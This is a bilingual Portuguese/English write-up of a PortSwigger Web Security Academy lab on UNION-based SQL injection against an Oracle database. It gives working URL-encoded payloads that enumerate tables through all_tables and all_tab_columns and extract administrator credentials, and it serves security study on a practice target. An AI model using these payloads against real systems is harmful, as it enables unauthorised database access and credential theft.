# Lab 06 — UNION Attack: Listing Database Contents (Oracle)

> 🇧🇷 [Português](#-português) · 🇺🇸 [English](#-english)

---

## 🇧🇷 Português

**Plataforma:** PortSwigger Web Security Academy  
**Categoria:** SQL Injection — UNION Attack  
**Dificuldade:** 🟡 Practitioner  
**Data:** 2026-06-06

### Descrição

Mesmo objetivo do lab anterior — extrair credenciais e logar como `administrator` — mas agora o banco é Oracle, o que muda as views de enumeração de schema.

### Conceito

No Oracle, o equivalente ao `information_schema` são as views do dicionário de dados:

- `all_tables` → lista todas as tabelas acessíveis
- `all_tab_columns` → lista colunas de uma tabela específica

Além disso, todo `SELECT` no Oracle exige `FROM` — por isso a tabela `dual` é usada quando não há tabela real para consultar.

### Reconhecimento

Confirmação de duas colunas com texto, usando `dual`:

```
'+UNION+SELECT+'abc','def'+FROM+dual--
```

### Exploração

**Passo 1 — Listar tabelas:**

```
'+UNION+SELECT+table_name,NULL+FROM+all_tables--
```

Identificada tabela com nome parecido com `USERS_ABCDEF` (Oracle usa maiúsculas por padrão).

**Passo 2 — Listar colunas:**

```
'+UNION+SELECT+column_name,NULL+FROM+all_tab_columns+WHERE+table_name='USERS_ABCDEF'--
```

Colunas retornadas: `USERNAME_ABCDEF` e `PASSWORD_ABCDEF`.

**Passo 3 — Extrair credenciais:**

```
'+UNION+SELECT+USERNAME_ABCDEF,+PASSWORD_ABCDEF+FROM+USERS_ABCDEF--
```

Credenciais do `administrator` obtidas. Login realizado.

### O que aprendi

- Oracle usa `all_tables` e `all_tab_columns` no lugar do `information_schema`
- Nomes de objetos no Oracle são armazenados em maiúsculas por padrão — importante ao filtrar por `table_name`
- A lógica do ataque é idêntica ao lab anterior, mas a sintaxe muda conforme o banco

### Referências

- [PortSwigger — Examining the Database](https://portswigger.net/web-security/sql-injection/examining-the-database)
- [PortSwigger — SQL Injection Cheat Sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)

---

## 🇺🇸 English

**Platform:** PortSwigger Web Security Academy  
**Category:** SQL Injection — UNION Attack  
**Difficulty:** 🟡 Practitioner  
**Date:** 2026-06-06

### Description

Same goal as the previous lab — extract credentials and log in as `administrator` — but now the database is Oracle, which changes the schema enumeration views.

### Concept

In Oracle, the equivalent of `information_schema` are the data dictionary views:

- `all_tables` → lists all accessible tables
- `all_tab_columns` → lists columns for a specific table

Also, every Oracle `SELECT` requires `FROM` — so the `dual` table is used when no real table is needed.

### Reconnaissance

Confirming two text columns using `dual`:

```
'+UNION+SELECT+'abc','def'+FROM+dual--
```

### Exploitation

**Step 1 — List tables:**

```
'+UNION+SELECT+table_name,NULL+FROM+all_tables--
```

Identified a table named something like `USERS_ABCDEF` (Oracle uses uppercase by default).

**Step 2 — List columns:**

```
'+UNION+SELECT+column_name,NULL+FROM+all_tab_columns+WHERE+table_name='USERS_ABCDEF'--
```

Returned columns: `USERNAME_ABCDEF` and `PASSWORD_ABCDEF`.

**Step 3 — Extract credentials:**

```
'+UNION+SELECT+USERNAME_ABCDEF,+PASSWORD_ABCDEF+FROM+USERS_ABCDEF--
```

Admin credentials obtained. Login completed.

### What I learned

- Oracle uses `all_tables` and `all_tab_columns` instead of `information_schema`
- Object names in Oracle are stored uppercase by default — important when filtering by `table_name`
- The attack logic is identical to the previous lab, but syntax varies by database

### References

- [PortSwigger — Examining the Database](https://portswigger.net/web-security/sql-injection/examining-the-database)
- [PortSwigger — SQL Injection Cheat Sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)
